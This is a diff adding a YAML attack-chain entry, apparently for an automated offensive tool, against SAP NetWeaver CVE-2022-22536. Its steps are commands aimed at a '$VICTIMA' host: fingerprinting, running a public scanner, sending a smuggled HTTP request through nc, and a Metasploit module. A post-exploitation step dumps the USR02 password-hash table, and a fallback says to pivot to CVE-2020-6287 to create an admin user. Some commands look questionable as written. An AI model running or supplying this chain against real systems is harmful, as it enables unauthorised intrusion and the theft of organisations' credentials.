@@ -1,0 +1,65 @@
+chain_id: sap_netweaver_cve_2022_22536
+title: "SAP NetWeaver — CVE-2022-22536 ICM memory pipes smuggling → unauth RCE"
+severity: CRITICAL
+tags: [web, sap, netweaver, cve-2022-22536, http-smuggling, rce, icmad]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2022-22536" }
+    - { banner_pattern: "(?i)sap.*netweaver|sap\\s*web\\s*dispatcher|sap\\s*itp" }
+    - { product_pattern: "(?i)sap" }
+    - { port_in: [50000, 50001, 8000, 8443, 1080, 1090, 44380, 44300] }
+
+description: |
+  SAP NetWeaver Application Server / Content Server / Web Dispatcher
+  ICM (Internet Communication Manager) mishandles `Content-Length`
+  vs `Transfer-Encoding` chunking, allowing an attacker to smuggle a
+  second HTTP request that bypasses front-end auth and hits sensitive
+  back-end endpoints. End state: unauth RCE on the SAP host. CISA-
+  flagged Feb 2022 as one of the highest-CVSS bugs ever in SAP. The
+  fix is per-product kernel patches; install base is enormous and
+  slow to update.
+
+steps:
+  - id: 1
+    title: "Fingerprint SAP / version"
+    command: |
+      curl -sk -i "https://$VICTIMA:50000/" | grep -i 'sap'
+      curl -sk "https://$VICTIMA:50000/sap/public/info" 2>/dev/null
+
+  - id: 2
+    title: "Run Onapsis's public PoC (icmad scanner)"
+    command: |
+      git clone https://github.com/Onapsis/onapsis_icmad_scanner /tmp/icmad
+      python3 /tmp/icmad/icmad_scanner.py -t https://$VICTIMA:50000
+
+  - id: 3
+    title: "Smuggle a second request bypassing the IDM front-end"
+    command: |
+      printf 'POST /sap/public/icf_info/icr_groups HTTP/1.1\r\nHost: %s\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /sap/admin/public/index.html HTTP/1.1\r\nHost: %s\r\n\r\n' \
+        "$VICTIMA" "$VICTIMA" | nc -nv $VICTIMA 50000
+
+  - id: 4
+    title: "Or with Metasploit"
+    command: |
+      msfconsole -qx 'use auxiliary/scanner/http/sap_icmad_scanner; \
+        set RHOSTS $VICTIMA; set RPORT 50000; run'
+
+  - id: 5
+    title: "Post — SAP user-master tables hold every business cred"
+    command: |
+      # On a SAP shell:
+      sapcontrol -nr 00 -function GetProcessList
+      # Read ABAP USR02 table (password hashes):
+      R3trans -d -u 1 USR02
+
+common_errors:
+  - error: "icmad_scanner: 'service not vulnerable'"
+    solution: |
+      Patched (SAP Note 3123396 + per-product kernel patches). Pivot to
+      CVE-2020-6287 (RECON) for unauth admin user creation on Java
+      stack — different surface, similar pre-auth criticality.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2022-22536
+  - https://www.onapsis.com/blog/cve-2022-22536-icmad-vulnerabilities
